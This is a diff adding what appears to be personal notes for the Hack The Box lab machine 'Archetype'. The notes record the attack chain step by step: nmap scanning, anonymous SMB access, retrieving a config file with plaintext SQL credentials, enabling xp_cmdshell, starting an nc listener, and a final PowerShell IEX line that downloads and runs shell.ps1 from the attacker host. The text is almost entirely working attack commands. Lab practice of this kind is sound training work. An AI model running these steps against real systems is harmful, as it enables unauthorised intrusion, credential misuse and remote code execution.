@@ -1,0 +1,37 @@
+nmap -Pn -sC -sV -A -T4 -A 10.10.10.27 -oN ~/Desktop/my_data/archetype_box/archetype_nmap.txt
+### shows port 445 open
+### seeing if we can anon login
+smb client -N -L \\\\10.10.10.27\\
+dir
+### we can see a backups folder
+smbclient -N \\\\10.10.10.27\\backups
+dir
+get prod.dtsConfig
+exit
+### closing session to analyze dtsConfig
+nano prod.dtsConfig
+
+### we find sql creds in this file and will try to connect with mssqlclient.py
+### Password = M3g4c0rp123 ### User = ARCHETYPE\sql_svc
+
+mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth
+SELECT IS_SRVROLEMEMBER ('sysadmin')
+
+EXEC sp_configure 'Show Advanced Options', 1;
+reconfigure;
+sp_configure;
+EXEC sp_configure 'xp_cmdshell', 1
+reconfigure;
+xp_cmdshell "whoami"
+
+
+
+### on local machine set-up python simple http server to xfer payload
+sudo python3 -m http.server 8080
+
+nc -lvnp 443
+ufw allow from 10.10.10.27 proto tcp to any port 8080,443
+
+
+
+xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.26/shell.ps1\");"
